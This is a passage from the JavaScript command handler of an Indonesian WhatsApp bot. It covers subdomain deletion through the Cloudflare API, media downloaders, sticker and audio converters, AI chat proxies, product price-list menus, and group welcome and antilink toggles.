        var apinya
        var tldnya
        if (/domain1/.test(pusat)) {
          zonenya = global.zone1
          apinya = global.apitoken1
          tldnya = global.tld1
        } else if (/domain2/.test(pusat)) {
          zonenya = global.zone2
          apinya = global.apitoken2
          tldnya = global.tld2
        } else if (/domain3/.test(pusat)) {
          zonenya = global.zone3
          apinya = global.apitoken3
          tldnya = global.tld3
        } else return SkyReply("Domain Tidak Ditemukan")
        if (!sub.includes(".")) return SkyReply("Format Subdomain Tidak Valid!")
        var host = sub.toLowerCase()
        var dom = null
        var id = null
        await axios.get(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`, {
          headers: {
            Authorization: "Bearer " + apinya,
            "Content-Type": "application/json",
          },
        }).then(async (res) => {
          await res.data.result.forEach((e) => {
            if (e.name == host) {
              dom = e.name
              id = e.id
            }
          })
        })
        if (dom == null && id == null) return SkyReply("Subdomain Tidak Ditemukan")
        await fetch(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records/${id}`, {
          "method": "DELETE",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            Authorization: "Bearer " + apinya,
            "Content-Type": "application/json",
          }
        })
        SkyReply(`*Berhasil Menghapus Subdomain ✅*
*Subdomain :* ${dom}
*Domain Induk :* ${tldnya}`)
      }
        break
      case "tts": {
        if (!text) return SkyReply(example("Hallo saya manusia"))
        if (text.length >= 300) return SkyReply("Jumlah huruf harus di bawah 300!")
        SkyReply(msg.wait)
        let id = 'id_001'
        try {
          const { data } = await axios.post("https://tiktok-tts.weilnet.workers.dev/api/generation", {
            "text": text,
            "voice": id
          })
          Reza.sendMessage(m.chat, { audio: Buffer.from(data.data, "base64"), mimetype: "audio/mp4" }, { quoted: m })
        } catch (e) {
          return SkyReply(e.toString())
        }
      }
        break
      case "ytplay": case "play": {
        if (!text) return SkyReply(example('Dj tiktok'))
        SkyReply(msg.wait)
        const { pipeline } = require('stream')
        const { promisify } = require('util')
        const streamPipeline = promisify(pipeline)
        try {
          let search = await yts(text)
          let vid = search.videos[0]
          console.log(vid)
          let { title, thumbnail: thumb, timestamp, author, url } = vid
          const audioStream = ytdl(url, {
            filter: 'audioonly',
            quality: 'highestaudio'
          })
          let acak = await getRandom(".mp3")
          let temp = "./all/tmp/" + acak
          const writableStream = fs.createWriteStream(temp)
          await streamPipeline(audioStream, writableStream)
          await Reza.sendMessage(m.chat, { audio: fs.readFileSync(temp), mimetype: 'audio/mpeg', contextInfo: { externalAdReply: { thumbnailUrl: thumb, title: title, body: "Duration : " + timestamp + " | " + "Author : " + author.name, sourceUrl: url, renderLargerThumbnail: true, mediaType: 1 } } }, { quoted: m })
          await fs.unlinkSync(temp)
        } catch (e) {
          return SkyReply(e.toString())
        }
      }
        break
      case "qc": {

        if (!text) return m.reply(example('teksnya'))

        let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]

        let reswarna = await warna[Math.floor(Math.random() * warna.length)]

        m.reply(msg.wait)

        const json = {

          "type": "quote",

          "format": "png",

          "backgroundColor": reswarna,

          "width": 512,

          "height": 768,

          "scale": 2,

          "messages": [

            {

              "entities": [],

              "avatar": true,

              "from": {

                "id": 1,

                "name": m.pushName,

                "photo": {

                  "url": ppuser

                }

              },

              "text": text,

              "replyMessage": {}

            }

          ]

        };

        const response = axios.post('https://bot.lyo.su/quote/generate', json, {

          headers: { 'Content-Type': 'application/json' }

        }).then(async (res) => {

          const buffer = Buffer.from(res.data.result.image, 'base64')

          let tempnya = makeid + ".png"

          await fs.writeFile(tempnya, buffer, async (err) => {

            if (err) return m.reply("Error")

            await Reza.sendStimg(m.chat, tempnya, m, { packname: namabot })

            fs.unlinkSync(`./${tempnya}`)

          })

        })

      }

        break
        break
      case "list_vps": {
        let teks = hargavps
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: teks
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      "name": "cta_url",
                      "buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
                    }]
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: qtoko })
        await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "list_domain": {
        let teks = hargadomain
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: teks
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      "name": "cta_url",
                      "buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
                    }]
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: qtoko })
        await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "list_nokos": {
        let teks = harganokos
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: teks
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      "name": "cta_url",
                      "buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
                    }]
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: qtoko })
        await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
        break
      case "list_panel": {
        const teks = hargapanel
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: teks
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      "name": "cta_url",
                      "buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
                    }]
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: qtoko })
        await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "list_suntik": {
        const teks = hargasuntik
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: teks
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      "name": "cta_url",
                      "buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
                    }]
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: qtoko })
        await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "list_scbot": {
        let teks = `
Script *SlimexTzy V5* Di Jual Dengan Harga *Rp20.000*, Jika Berminat Silahkan Klik Tombol Di Bawah Ini`
        let msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: teks
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      "name": "cta_url",
                      "buttonParamsJson": `{\"display_text\":\"Beli Script Bot\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
                    }]
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: qtoko })
        await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "remini": case "tohd": case "hd": {
        if (/image/g.test(mime)) {
          SkyReply(msg.wait)
          let tingkat
          if (/remini/gi.test(command)) tingkat = 4
          if (/tohd|hd/gi.test(command)) tingkat = 2
          await Reza.downloadAndSaveMediaMessage(qmsg).then(async (res) => {
            let urlnya = await telegraPh(res)
            let image = await fetchJson(`https://aemt.me/remini?url=${urlnya}&resolusi=${tingkat}`)
            if (!image.status) return SkyReply("Error!")
            await Reza.sendMessage(m.chat, { image: { url: image.url }, caption: "Berhasil ✅" }, { quoted: m })
            await fs.unlinkSync(res)
          }).catch(err => SkyReply(err.toString()))
        } else return SkyReply(example('dengan mengirim foto'))
      }
        break
      case "chatgpt": case "gpt": {
        if (!text) return SkyReply(example("apa itu nodejs"))
        SkyReply(msg.wait)
        await fetchJson(`https://aemt.me/gpt4?text=${text}`).then((e) => {
          if (!e.status) return SkyReply(JSON.stringify(e, null, 2))
          var teks = `*© GPT - Chat Version 0.4*\n\n${e.result}`
          SkyReply(teks)
        })
      }
        break
      case "ai": case "openai": {
        if (!text) return SkyReply(example("kamu siapa"))
        SkyReply(msg.wait)
        await fetchJson(`https://aemt.me/openai?text=${text}`).then((e) => {
          if (!e.status) return SkyReply(JSON.stringify(e, null, 2))
          var teks = `*© AI - Asistent V5.0.0*\n\n${e.result}`
          SkyReply(teks)
        })
      }
        break
      case "toptv": {
        if (/video/.test(qmsg.mimetype)) {
          if ((qmsg).seconds > 30) return SkyReply("Durasi vidio maksimal 30 detik!")
          let ptv = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({ ptvMessage: qmsg }), { userJid: m.chat, quoted: m })
          Reza.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id })
        } else {
          return SkyReply(example("dengan mengirim/balas vidio"))
        }
      }
        break
      case "toimage": {
        if (!/webp/.test(mime) && !/audio/.test(mime)) return SkyReply(example('dengan reply sticker'))
        SkyReply(msg.wait)
        let media = await Reza.downloadAndSaveMediaMessage(qmsg)
        let ran = `${makeid}.png`
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media)
          if (err) return err
          let buffer = fs.readFileSync(ran)
          Reza.sendMessage(m.chat, { image: buffer }, {
            quoted: m
          })
          fs.unlinkSync(ran)
        })
      }
        break
      case "tovn": case "toptt": {
        if (!/video|audio/.test(mime) && !/audio/.test(mime)) return SkyReply(example('dengan mengirim audio/vidio'))
        SkyReply(msg.wait)
        await Reza.downloadMediaMessage(qmsg).then(async (res) => {
          let anu = await toPTT(res, 'mp4')
          Reza.sendMessage(m.chat, { audio: anu, mimetype: 'audio/mpeg', ptt: true }, { quoted: m })
        })
      }
        break
      case "toaudio": case "tomp3": {
        if (!/video/.test(mime) && !/audio/.test(mime)) return SkyReply(example('dengan mengirim vidio'))
        if ((qmsg).seconds > 30) return SkyReply("Durasi vidio maksimal 30 detik")
        SkyReply(msg.wait)
        await Reza.downloadMediaMessage(qmsg).then(async (res) => {
          let anu = await toAudio(res, 'mp4')
          Reza.sendMessage(m.chat, { audio: anu, mimetype: 'audio/mpeg' }, { quoted: m })
        })
      }
        break
      case "sticker": case "stiker": case "sgif": case "s": {
        if (!/image|video/.test(mime)) return SkyReply(example("dengan mengirim foto/vidio"))
        if (/video/.test(mime)) {
          if ((qmsg).seconds > 15) return SkyReply("Durasi vidio maksimal 15 detik!")
        }
        SkyReply(msg.wait)
        var media = await Reza.downloadAndSaveMediaMessage(qmsg)
        await Reza.sendStimg(m.chat, media, m, { packname: global.packname })
        await fs.unlinkSync(media)
      }
        break
      case "tourl": {
        if (!/image/.test(mime)) return SkyReply(example("dengan mengirim foto"))
        await SkyReply(msg.wait)
        var fotonya = await Reza.downloadAndSaveMediaMessage(qmsg)
        var urlimage = await telegraPh(fotonya)
        await SkyReply(`Link Tautan :\n${urlimage}`)
        await fs.unlinkSync(fotonya)
      }
        break
      case "public": {
        if (!isOwner) return SkyReply(msg.owner)
        Reza.public = true
        SkyReply("*Berhasil Mengganti Mode ✅*\nMode Bot Beralih Ke *Public*")
      }
        break
      case "self": {
        if (!isOwner) return SkyReply(msg.owner)
        Reza.public = false
        SkyReply("*Berhasil Mengganti Mode ✅*\nMode Bot Beralih Ke *Self*")
      }
        break
      case "get": {
        if (!isOwner) return SkyReply(msg.owner)
        if (!text) return SkyReply("linknya")
        try {
          var check = await fetchJson(text)
          SkyReply(JSON.stringify(check, null, 2))
        } catch (e) {
          return SkyReply(e.toString())
        }
      }
        break
      case "setteksjpm": {
        if (!isOwner) return SkyReply(msg.owner)
        if (text || m.quoted) {
          const newteks = m.quoted ? m.quoted.text : text
          await fs.writeFileSync("./list/teksjpm.js", newteks.toString())
          SkyReply("*Teks JPM Berhasil Diganti ✅*")
        } else {
          return SkyReply(example("dengan reply/kirim teks\n\nUntuk melihat teks jpm saat ini ketik *.teksjpm*"))
        }
      }
        break
      case "teksjpm": {
        if (!isOwner) return SkyReply(msg.owner)
        SkyReply(fs.readFileSync("./list/teksjpm.js").toString())
      }
        break
      case "instagram": case "igdl": case "ig": {
        if (!text) return SkyReply(example("linknya"))
        if (!text.includes("instagram.com")) return SkyReply("Link tautan tidak valid!")
        SkyReply(msg.wait)
        await api.igdl(`${text}`).then((res) => {
          for (let a of res.result) {
            Reza.sendMedia(m.chat, a.url, m, {
              caption: "*Instagram Downloader ✅*"
            })
          }
        }).catch(e => SkyReply(e.toString()))
      }
        break
      case "tiktokaudio": case "tiktokmp3": case "ttaudio": case "ttmp3": {
        if (!text) return SkyReply(example("linknya"))
        if (!text.includes("tiktok.com")) return SkyReply("Link tautan tidak valid!")
        SkyReply(msg.wait)
        await fetchJson(`https://aemt.me/download/tiktokdl?url=${text}`).then((res) => {
          Reza.sendMessage(m.chat, { audio: { url: res.result.music }, mimetype: "audio/mpeg" }, { quoted: m })
        }).catch(e => SkyReply(e.toString()))
      }
        break
      case "mediafire": {
        if (!text) return SkyReply(example("linknya"))
        if (!text.includes('mediafire.com')) return SkyReply("Link Tautan Tidak Valid!")
        SkyReply(msg.wait)
        await api.mediafireDl(text).then((res) => {
          if (res.filesize.includes("GB")) return SkyReply("Gagal mendownload, ukuran file terlalu besar")
          if (res.filesize.split("MB")[0] >= 100) return SkyReply("Gagal mendownload, ukuran file terlalu besar")
          if (res.url == "") return SkyReply(msg.error)
          Reza.sendMessage(m.chat, { document: { url: res.url }, fileName: res.filename, mimetype: "application/" + res.ext.toLowerCase(), caption: "*Mediafire Downloader ✅*" }, { quoted: m })
        }).catch((e) => SkyReply(e.toString()))
      }
        break
      case "pinterest": case "pin": {
        if (!text) return SkyReply(example("tobrut"))
        SkyReply(global.msg.wait)
        let res = await pinterest(text)
        if (res.length == 0) return SkyReply("Error, Foto Tidak Ditemukan")
        if (res.length < 5) {
          anuan = res
        } else {
          anuan = res.slice(0, 5)
        }
        let anu = new Array()
        for (let ii of anuan) {
          let imgsc = await prepareWAMessageMedia({ image: await fetch(`${ii}`) }, { upload: Reza.waUploadToServer })
          anu.push({
            header: proto.Message.InteractiveMessage.Header.fromObject({
              hasMediaAttachment: true,
              ...imgsc
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${ii}\",\"merchant_url\":\"https://www.google.com\"}`
                }
              ]
            })
          })
        }

        const msgii = await generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body: proto.Message.InteractiveMessage.Body.fromObject({
                  text: "🔎 Berikut Adalah Hasil Pencarian Foto Dari *Pinterest*"
                }),
                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                  cards: anu
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: m })

        await Reza.relayMessage(m.chat, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break
      case "getcase": {
        if (!isOwner) return SkyReply(msg.owner)
        if (!text) return SkyReply(example("menu"))
        const getcase = (cases) => {
          return "case " + `\"${cases}\"` + fs.readFileSync('./Reza.js').toString().split('case \"' + cases + '\"')[1].split("break")[0] + "break"
        }
        try {
          SkyReply(`${getcase(q)}`)
        } catch (e) {
          return SkyReply(`Case *${text}* Tidak Ditemukan`)
        }
      }
        break
      case "tiktok": case "tt": {
        if (!text) return SkyReply(example('linknya'))
        if (!/tiktok.com/.test(text)) return SkyReply("Link Tautan Tidak Valid!")
        SkyReply(msg.wait)
        let anuan = text
        await api.tiktok(anuan).then(async (res) => {
          var cap = `*Tiktok Downloader ✅*`
          if (res.result.duration == 0) {
            if (res.result.images.length > 1) {
              let araara = new Array()
              let urutan = 0
              for (let a of res.result.images) {
                let imgsc = await prepareWAMessageMedia({ image: await fetch(`${a}`) }, { upload: Reza.waUploadToServer })
                await araara.push({
                  header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: `Foto Slide Ke *${urutan += 1}*`,
                    hasMediaAttachment: true,
                    ...imgsc
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [{
                      "name": "cta_url",
                      "buttonParamsJson": `{\"display_text\":\"Link Tautan\",\"url\":\"${a}\",\"merchant_url\":\"https://www.google.com\"}`
                    }, {
                      "name": "quick_reply",
                      "buttonParamsJson": `{\"display_text\":\"Tiktok Audio\",\"title\":\"Audio Mp3\",\"id\":\".tiktokmp3 ${text}\"}`
                    }]
                  })
                })
              }
              const msgii = await generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                  message: {
                    messageContextInfo: {
                      deviceListMetadata: {},
                      deviceListMetadataVersion: 2
                    }, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: "Berikut Adalah Foto Hasil Result Dari *Tiktok Slide* ⬇️"
                      }),
                      carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: araara
                      })
                    })
                  }
                }
              }, { userJid: m.sender, quoted: m })
              await Reza.relayMessage(m.chat, msgii.message, {
                messageId: msgii.key.id
              })
            } else {
              Reza.sendMessage(m.chat, { image: { url: result.data.images[0] }, caption: cap }, { quoted: m })
            }
          } else {
            let vidnya = await prepareWAMessageMedia({ video: await fetch(`${res.result.play}`) }, { upload: Reza.waUploadToServer })
            let msgii = await generateWAMessageFromContent(m.chat, {
              viewOnceMessage: {
                message: {
                  "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                  },
                  interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: {
                      mentionedJid: [m.sender]
                    }, body: proto.Message.InteractiveMessage.Body.create({
                      text: cap
                    }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                      hasMediaAttachment: true,
                      ...vidnya
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{
                        name: "quick_reply",
                        buttonParamsJson: `{\"display_text\":\"Tiktok Audio\",\"title\":\"Audio Mp3\",\"id\":\".tiktokmp3 ${text}\"}`
                      }]
                    })
                  })
                }
              }
            }, { userJid: m.sender, quoted: m })
            await Reza.relayMessage(m.chat, msgii.message, {
              messageId: msgii.key.id
            })
          }
        }).catch(e => SkyReply(`${e}`))
      }
        break
      case "facebook": case "fb": case "fbdl": {
        if (!text) return SkyReply(example("linkvidionya"))
        if (!/facebook.com/.test(text)) return SkyReply("Link Tautan Tidak Valid!")
        SkyReply(msg.wait)
        await fetchJson(`https://aemt.me/download/fbdown?url=${text}`).then((res) => {
          if (!res.status) return SkyReply(JSON.stringify(res, null, 2))
          Reza.sendMessage(m.chat, { video: { url: `${res.result.url.isHdAvailable == true ? res.result.url.urls[0].hd : res.result.url.urls[0].sd}` }, mimetype: 'video/mp4', caption: `*Facebook Downloader ✅*` }, { quoted: m })
        }).catch(e => SkyReply(e.toString()))
      }
        break
      case "owner": {
        Reza.sendContact(m.chat, [owner], "Telfon/VC = Blokir", null, {
          contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
              showAdAttribution: true,
              thumbnail: await fs.readFileSync("./media/Reza.jpg"),
              title: `© Copyright ${global.namabot}`,
              renderLargerThumbnail: true,
              sourceUrl: global.linkyt,
              mediaType: 1
            }
          }
        })
      }
        break
      case "welcome": {
        if (!isGroup) return SkyReply(msg.group)
        if (!isOwner && !isAdmin) return SkyReply(msg.admin)
        if (!text) {
          let teksnya = `
Pilih Salah Satu Option *Welcome* Di Bawah Ini`
          let msgii = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [m.sender]
                  }, body: proto.Message.InteractiveMessage.Body.create({
                    text: teksnya
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Grup Setting\",\"title\":\"Status Grup\",\"id\":\".statusgc\"}"
                    },
                    {
                      "name": "single_select",
                      "buttonParamsJson": `{ "title": "Pilih Options", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "rows": [{ "header": "Welcome ON", "title": "Aktifkan Welcome Di Grup Ini", "id": ".welcome on" }, 
{ "header": "Welcome OFF", "title": "Matikan Welcome Di Grup Ini", "id": ".welcome off" }]}]}`
                    }]
                  })
                })
              }
            }
          }, { userJid: m.sender, quoted: qcall })
          return Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
            messageId: msgii.key.id
          })
        }
        if (text == "on") {
          if (welcome.includes(m.chat)) return SkyReply("Welcome Di Grup Ini Sudah Aktif")
          await welcome.push(m.chat)
          await fs.writeFileSync("./all/database/welcome.json", JSON.stringify(welcome))
          let teksnya = `*Welcome Berhasil Diaktifkan ✅*

Klik Tombol Di Bawah Ini Untuk Melihat *Status Setting Grup*`
          let msgii = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [m.sender]
                  }, body: proto.Message.InteractiveMessage.Body.create({
                    text: teksnya
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Grup Setting\",\"title\":\"Status Grup\",\"id\":\".statusgc\"}"
                    },
                    {
                      "name": "single_select",
                      "buttonParamsJson": `{ "title": "Pilih Options", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "rows": [{ "header": "Welcome ON", "title": "Aktifkan Welcome Di Grup Ini", "id": ".welcome on" }, 
{ "header": "Welcome OFF", "title": "Matikan Welcome Di Grup Ini", "id": ".welcome off" }]}]}`
                    }]
                  })
                })
              }
            }
          }, { userJid: m.sender, quoted: qcall })
          await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
            messageId: msgii.key.id
          })
        } else if (text == "off") {
          if (!welcome.includes(m.chat)) return SkyReply("Grup Ini Tidak Terdaftar Di Database Welcome")
          let posi = welcome.indexOf(m.chat)
          await welcome.splice(posi, 1)
          await fs.writeFileSync("./all/database/welcome.json", JSON.stringify(welcome))
          let teksnya = `*Welcome Berhasil Dimatikan ✅*

Klik Tombol Di Bawah Ini Untuk Melihat *Status Setting Grup*`
          let msgii = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [m.sender]
                  }, body: proto.Message.InteractiveMessage.Body.create({
                    text: teksnya
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Grup Setting\",\"title\":\"Status Grup\",\"id\":\".statusgc\"}"
                    },
                    {
                      "name": "single_select",
                      "buttonParamsJson": `{ "title": "Pilih Options", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "rows": [{ "header": "Welcome ON", "title": "Aktifkan Welcome Di Grup Ini", "id": ".welcome on" }, 
{ "header": "Welcome OFF", "title": "Matikan Welcome Di Grup Ini", "id": ".welcome off" }]}]}`
                    }]
                  })
                })
              }
            }
          }, { userJid: m.sender, quoted: qcall })
          await Reza.relayMessage(m.chat, msgii.message, {
            messageId: msgii.key.id
          })
        }
      }
        break
      case "antilink": {
        if (!isGroup) return SkyReply(msg.group)
        if (!isOwner && !isAdmin) return SkyReply(msg.admin)
        if (!text) {
          let teksnya = `
Pilih Salah Satu Option *Antilink* Di Bawah Ini`
          let msgii = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [m.sender]
                  }, body: proto.Message.InteractiveMessage.Body.create({
                    text: teksnya
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Grup Setting\",\"title\":\"Status Grup\",\"id\":\".statusgc\"}"
                    },
                    {
                      "name": "single_select",
                      "buttonParamsJson": `{ "title": "Pilih Options", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "rows": [{ "header": "Antilink ON", "title": "Aktifkan Antilink Grup Lain", "id": ".antilink on" }, 
{ "header": "Antilink OFF", "title": "Matikan Antilink Grup Lain", "id": ".antilink off" }]}]}`
                    }]
                  })
                })
              }
            }
          }, { userJid: m.sender, quoted: qcall })
          return Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
            messageId: msgii.key.id
          })
        }
        if (text == "on") {
          if (antilink.includes(m.chat)) return SkyReply("Antilink Di Grup Ini Sudah Aktif!")
          if (antilink2.includes(m.chat)) {
            let posi = antilink2.indexOf(m.chat)
            antilink2.splice(posi, 1)
            await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
          }
          await antilink.push(m.chat)
          await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
          let teksnya = `*Antilink Berhasil Diaktifkan ✅*

Klik Tombol Di Bawah Ini Untuk Melihat *Status Setting Grup*`
          let msgii = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [m.sender]
                  }, body: proto.Message.InteractiveMessage.Body.create({
                    text: teksnya
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Grup Setting\",\"title\":\"Status Grup\",\"id\":\".statusgc\"}"
                    },
                    {
                      "name": "single_select",
                      "buttonParamsJson": `{ "title": "Pilih Options", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "rows": [{ "header": "Antilink ON", "title": "Aktifkan Antilink Grup Lain", "id": ".antilink on" }, 
{ "header": "Antilink OFF", "title": "Matikan Antilink Grup Lain", "id": ".antilink off" }]}]}`
                    }]
                  })
                })
              }
            }
          }, { userJid: m.sender, quoted: qcall })
          await Reza.relayMessage(msgii.key.remoteJid, msgii.message, {
            messageId: msgii.key.id
          })
        } else if (text == "off") {
          if (!antilink.includes(m.chat)) return SkyReply("Grup Ini Tidak Terdaftar Di Database Antilink")
          let posi = antilink.indexOf(m.chat)
          await antilink.splice(posi, 1)
          await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
          let teksnya = `*Antilink Berhasil Dimatikan ✅*

Klik Tombol Di Bawah Ini Untuk Melihat *Status Setting Grup*`
          let msgii = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [m.sender]
                  }, body: proto.Message.InteractiveMessage.Body.create({
                    text: teksnya
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Status Grup Setting\",\"title\":\"Status Grup\",\"id\":\".statusgc\"}"
                    },
                    {
                      "name": "single_select",
